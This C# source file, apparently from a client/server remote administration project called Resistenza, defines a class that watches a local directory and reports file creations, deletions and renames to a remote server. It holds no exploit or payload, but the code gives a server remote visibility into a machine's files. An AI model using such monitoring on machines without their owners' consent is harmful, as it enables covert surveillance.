using Resistenza.Common.Networking;
using Resistenza.Common.Packets;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Resistenza.Client.Networking
{
    internal class FileChangeNotifier
    {

        SecureStream _ServerStream;
        FileSystemWatcher _LocalFileWatcher = new FileSystemWatcher();
        public bool IsActive { get; private set; }

        public FileChangeNotifier(SecureStream ServerSream) { 

            _ServerStream = ServerSream;
            IsActive = false;

        }

        public bool SetDirectoryToMonitor(string Path)
        {
            if(Directory.Exists(Path))
            {
                _LocalFileWatcher.Path = Path;
                return true;
            }
            return false;
            
        }

        public void Start()
        {
            
            if(_LocalFileWatcher.Path == null || _LocalFileWatcher.Path == string.Empty)
            {
                throw new InvalidOperationException("Start() can't be called without having set a valid directory to monitor first.");
            }


            _LocalFileWatcher.IncludeSubdirectories = false;
            _LocalFileWatcher.EnableRaisingEvents = true;

            _LocalFileWatcher.Deleted += NotifyServerAsync;
            _LocalFileWatcher.Created += NotifyServerAsync;
            _LocalFileWatcher.Renamed += NotifyServerAsync;

            IsActive = true;
        }

        public void Stop()
        {

            if (!IsActive)
            {
                throw new InvalidOperationException("Stop() can't be called without having called Start() first");
            }

            _LocalFileWatcher.Deleted -= NotifyServerAsync;
            _LocalFileWatcher.Created -= NotifyServerAsync;
            _LocalFileWatcher.Renamed -= NotifyServerAsync;

            IsActive = false;
        }

        private async void NotifyServerAsync(object sender, FileSystemEventArgs e)
        {
            string? ParentDir = Directory.GetParent(e.FullPath).FullName;
                     
            var RequestToHandle = new DirectoryDataRequest
            {
                Directory = Directory.Exists(e.FullPath) ? e.FullPath : ParentDir,

            };

            await RequestToHandle.HandleAsync(_ServerStream);
            
        }

        
    }
}
